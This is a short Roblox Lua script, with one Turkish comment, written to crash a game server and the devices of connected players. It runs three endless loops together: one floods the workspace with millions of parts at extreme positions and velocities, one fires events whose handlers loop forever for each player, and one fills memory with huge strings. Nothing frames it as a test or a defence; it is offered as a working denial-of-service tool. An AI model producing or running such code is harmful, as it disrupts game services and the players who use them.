local RunService = game:GetService("RunService")
local Players = game:GetService("Players")


local function crashServer()
    while true do
        for i = 1, 1000000 do
            local part = Instance.new("Part")
            part.Position = Vector3.new(math.random(-1e8, 1e8), math.random(-1e8, 1e8), math.random(-1e8, 1e8))
            part.Velocity = Vector3.new(math.random(-1e8, 1e8), math.random(-1e8, 1e8), math.random(-1e8, 1e8))
            part.Parent = workspace
        end
        RunService.Heartbeat:Wait()
    end
end


local function crashDevices()
    for _, player in ipairs(Players:GetPlayers()) do
        coroutine.wrap(function()
            while true do
                for i = 1, 1000000 do
                    local event = Instance.new("BindableEvent")
                    event.Event:Connect(function()
                        while true do end
                    end)
                    event:Fire()
                end
                wait()
            end
        end)()
    end
end

-- Bellek Tüketme Fonksiyonu
local function consumeMemory()
    local bigTable = {}
    while true do
        for i = 1, 1000000 do
            table.insert(bigTable, string.rep("a", 10000))
        end
        wait()
    end
end


coroutine.wrap(crashServer)()
coroutine.wrap(crashDevices)()
coroutine.wrap(consumeMemory)()



